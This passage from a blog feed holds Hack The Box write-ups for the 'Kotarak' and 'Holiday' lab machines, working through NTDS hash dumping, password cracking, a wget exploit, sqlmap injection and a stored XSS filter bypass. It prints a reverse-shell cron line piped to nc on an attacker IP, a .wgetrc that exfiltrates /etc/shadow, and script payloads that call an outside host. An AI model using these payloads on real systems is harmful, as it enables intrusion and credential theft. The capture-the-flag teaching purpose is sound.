lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
atanas:x:1000:1000:atanas,,,:/home/atanas:/bin/bash
tomcat:x:1001:1001::/opt/tomcat:/bin/false
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
lxc-dnsmasq:x:112:119:LXC dnsmasq,,,:/var/lib/lxc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And after a bit of enumeration of the file system, in the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/tomcat/to_archive/pentest_data&lt;/code&gt; we find a couple of interesting files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /home
$ cd tomcatt
$ cd to_archive
$ cd pentest_data
$ ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dit&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bin&lt;/code&gt; file are look to be AD database files.&lt;/p&gt;

&lt;h2 id=&quot;what-is-the-file-ntdsdit&quot;&gt;What is the file ntds.dit?&lt;/h2&gt;

&lt;p&gt;The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.&lt;/p&gt;

&lt;p&gt;To use the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from impacket to dump the hashes, we need to download the files to our machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; download 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
[*] download   : 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -&amp;gt; 20170721114636_default_192.168.110.133_psexec.ntdsg
meterpreter &amp;gt; download 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
[*] download   : 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -&amp;gt; 20170721114637_default_192.168.110.133_psexec.ntdsg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s rename the files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; ls
ntds.bin
ntds.dit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we dump the content with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; tool:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; impacket-secretsdump -ntds ntds.dit -system ntds.bin LOCAL
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hash that we need to elevate to Atanos is that of the administrator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f16tomcat!&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ su atanas
su atanas
Password: f16tomcat!

atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ cat /home/atanas/user.txt
&amp;lt;mcat/to_archive/pentest_data$ cat /home/atanas/user.txt                     
93f844f50491ef797c9c1b601b4bece8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;

&lt;p&gt;Browsing the file system with Atanas, we notice two singularly interesting things:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ ls
app.log  flag.txt
atanas@kotarak-dmz:/root$ cat flag.txt
Getting closer! But what you are looking for can't be found here.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this one:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;App.log is as it gives us some of information: It shows that an IP of 10.0.3.133 utilises GET every 2 minutes to call a file called archive.tar.gz and the vulnerable version of wget. When looking at the content of ifconfig, it shows that we are also connected to the 10.0.3.0/24 network via a LXC bridge port with the IP address of 10.0.3.1, this indicates that the 10.0.3.133 is running in an LXC container with a vulnerable version of wget.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets also check the wget version of our machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ wget -V
GNU Wget 1.17.1 built on linux-gnu.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our version of wget is also vulnerable!&lt;/p&gt;

&lt;h2 id=&quot;wget-exploiting&quot;&gt;Wget exploiting&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.exploit-db.com/exploits/40064&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Wget &amp;lt; 1.18 when supplied with a malicious URL (to a malicious or compromised web server) can be tricked into saving an arbitrary remote file supplied by an attacker, with arbitrary contents and filename under the current directory and possibly other directories by writing to .wgetrc.&lt;/p&gt;

&lt;p&gt;First, let’s collect both .wgetrc and exploit.py files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; ls -lah
totale 16K
drwxr-xr-x 2 root root 4,0K apr 29 05:25 .
drwxr-xr-x 3 root root 4,0K apr 29 01:56 ..
-rw-r--r-- 1 root root 2,8K apr 29 02:31 exp.py
-rw-r--r-- 1 root root   70 apr 29 02:13 .wgetrc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;let’s adapt them to the our case:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; cat .wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And copy the exploit.py script from the exploit-db page to our machine and edit it accordingly::&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ROOT_CRON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;* * * * * root rm /tmp/i;mkfifo /tmp/i;cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need to install and run the python ftp with this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install pyftpdlib&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Download the exploit.py previously adapted to our case in the remote machine, and run it with this command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ authbind python exp.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.27:21. Let's go then

Serving wget exploit on port 80...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Any port below 1024 requires root access to run unless authbind is used. Authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. Authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.&lt;/p&gt;

&lt;p&gt;And when the crontab run (every two minutes) we will get back our root reverse shell!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 45718
/bin/sh: 0: can't access tty: job control turned off
# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat root/root.txt
uid=0(root) gid=0(root) groups=0(root)
root950d1425795dfd38272c93ccbb63ae2c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-for-fun-and-learning-not-for-profit&quot;&gt;Hack for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;Unfortunately we getting a root shell inside another machine, and the user Atanas can’t edit the webserver files owned by root!&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Kotarak" /><category term="SSRF" /><category term="NTDS files" /><category term="WGET Vulnerable" /><summary type="html">Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator's hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.</summary></entry><entry><title type="html">Holiday - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-holiday/" rel="alternate" type="text/html" title="Holiday - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-holiday</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-holiday/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can perform a SQL injection through a login form  retrieving the credentials.&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website and perform an XSS Stored bypassing the filters.&lt;/li&gt;
  &lt;li&gt;With a command injection and the appropriate regex bypass through a form, allow us to get a reverse shell.&lt;/li&gt;
  &lt;li&gt;Sudo -l allow us to install a malicious json package with npm.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 8000 Node.js Express Framework.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 16:08 CEST
Nmap scan report for 10.10.10.25
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;recon-http&quot;&gt;Recon HTTP&lt;/h2&gt;

&lt;p&gt;If we can try to connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.25:8000&lt;/code&gt; we will see just an image on the web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we can try to bruteforce the directories with dirsearch:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo dirsearch -&amp;gt; ./dirsearch.py -u 10.10.10.25:8000 -w /usr/share/dirb/wordlists/small.txt -e php,html,txt,css,js,xml

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, html, txt, css, js, xml | HTTP method: get | Threads: 10 | Wordlist size: 959

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-04-27_16-29-33.log

Target: 10.10.10.25:8000

[16:29:33] Starting: 
[16:29:33] 302 -   28B  - /Admin  -&amp;gt;  /login
[16:29:33] 302 -   28B  - /admin  -&amp;gt;  /login
[16:29:33] 302 -   28B  - /agent  -&amp;gt;  /login
[16:29:34] 301 -  165B  - /css  -&amp;gt;  /css/
[16:29:35] 301 -  165B  - /img  -&amp;gt;  /img/
[16:29:35] 301 -  163B  - /js  -&amp;gt;  /js/
[16:29:36] 302 -   28B  - /logout  -&amp;gt;  /login
[16:29:36] 200 -    1KB - /login
                                         
Task Completed 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here we are! We got an admin login page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sql-injection-through-post-parameters&quot;&gt;SQL injection through POST parameters&lt;/h2&gt;

&lt;p&gt;Unfortunately we don’t have the credentials to login, but, if we set our FoxyProxy to 8080 and we intercept a request to login from the /admin page through Burpsuite, we can send the request to sqlmap trying to inject some queries to retrieve the database content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:35:37 /2020-04-27/

[16:35:37] [INFO] parsing HTTP request from 'sql.txt'
[16:35:37] [INFO] testing connection to the target URL
[16:35:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:35:37] [INFO] testing if the target URL content is stable
[16:35:37] [INFO] target URL content is stable
[16:35:37] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[16:35:38] [INFO] testing for SQL injection on POST parameter 'username'
[16:35:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:35:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:35:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:35:44] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string=&quot;Invalid User&quot;)
[16:35:44] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'H2' 
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 228 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
---

[16:35:52] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! It worked! This happens because the parameters that pass the data to the back-end are not properly sanitized, since the concatenated queries allow the user input to be inserted. Now let’s extract the data from the database.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs --dump
        ___
       __H__                                                                                                                                                   
 ___ ___[)]_____ ___ ___  {1.3.11#stable}                                                                                                                      
|_ -| . [.]     | .'| . |                                                                                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                                                                                      
      |_|V...       |_|   http://sqlmap.org                                                                                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:07:51 /2020-04-27/

[17:07:51] [INFO] parsing HTTP request from 'sql.txt'
[17:07:52] [INFO] resuming back-end DBMS 'sqlite' 
[17:07:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
---
[17:07:52] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite

[17:12:30] [INFO] fetching entries for table 'notes' in database 'SQLite_masterdb'
[17:12:30] [INFO] fetching number of entries for table 'notes' in database 'SQLite_masterdb'
[17:13:58] [INFO] retrieved: 1
[17:13:58] [INFO] retrieved: 1
[17:13:59] [INFO] retrieved: 1
[17:14:00] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
[17:14:24] [INFO] retrieved: RickA
[17:14:28] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[17:14:28] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
&amp;gt; 1
[17:14:28] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[17:14:28] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[17:14:28] [INFO] starting 2 processes 
[17:14:43] [WARNING] no clear password(s) found                                                                                                               
Database: SQLite_masterdb
Table: users
[1 entry]
+----+--------+----------+----------------------------------+
| id | active | username | password                         |
+----+--------+----------+----------------------------------+
| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
+----+--------+----------+----------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally we retrieve an username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RickA&lt;/code&gt; and a MD5 password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fdc8cd4cff2c19e0d1022e78481ddf36&lt;/code&gt;, that making a search on google we can decrypt with md5hashing.net.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;login-with-credentials&quot;&gt;LOGIN with credentials&lt;/h2&gt;

&lt;p&gt;After the login we are redirected to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/agent&lt;/code&gt; which seems to be a management booking portal with agents credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By clicking on a random section, we can see some informations relative to the agent section:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And by consulting the notes option, we can assume there is some script going on the background that goes to a page and approve something.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cross-site-scripting-xss&quot;&gt;Cross-site scripting (XSS)&lt;/h2&gt;

&lt;p&gt;The message came from notes section makes me think I might be able to use javascript code to perform an XSS over an administrator account. Let’s test if I inject a ping command into an image tag, if it comes back:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=http://10.10.14.27:8000 /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.25 - - [27/Apr/2020 20:26:55] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got a ping back! But, I if try to use an HTML tag like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; the ping didn’t come back. That’s happens because the server sanitizes any HTML tags except for images tags. Fortunately we can bypass this filter, wrapping the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inside the img tag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=/&amp;gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that I was able to inject a script tag, the question became how I could use this to inject a javascript payload while bypassing any escaping. Using a combination of eval and String.fromCharCode I was able to inject an arbitrary javascript payload that would be executed as the administrator, using the following HTML as a wrapper.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(... payload ...))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this as the payload.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.write('&amp;lt;script src=&quot;http://10.10.14.27:8000&quot;&amp;gt;&amp;lt;/script&amp;gt;');
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

